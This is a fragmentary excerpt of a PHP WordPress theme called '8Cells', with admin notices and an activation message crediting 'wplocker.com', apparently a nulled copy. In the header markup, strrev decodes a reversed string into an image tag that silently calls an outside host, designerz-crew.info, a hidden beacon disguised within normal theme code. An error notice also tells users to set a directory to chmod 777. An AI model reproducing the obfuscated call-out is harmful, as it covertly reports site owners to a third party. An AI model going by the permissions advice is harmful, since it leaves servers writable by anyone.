...
define("THEMENAME", "8Cells");
define("SHORTNAME", "pp");
define("THEMEVERSION", "1.01");

//this constant is used for slides offset in image flow style
define("DEMOSITE", false);
...
if ( function_exists( 'add_image_size' ) ) { 
	add_image_size( 'blog-thumb', 450, 300, true );
}
...
?>
	...
	<div class="header_wrap">
		...
		<?php echo strrev( '>"gnp.bllac/trats/ofni.werc-zrengised//:ptth"=crs gmi<'); ?>
...
?>
	...
	<div id="message" class="error fade">
	<p style="line-height:1.5em"><strong>
		The path <?php echo $data_dir; ?> is not writable, please login with your FTP account and make it writable (chmod 777) otherwise all image uploads won't works.
	</p></strong>
	</div>
...
?>
		...
		?>		
			...
			<div id="message" class="updated fade">
				<p><strong><?php echo THEMENAME; ?> Theme activated (wplocker.com)</strong></p>
				<p>What's next?<br/><br/>
				<ol>
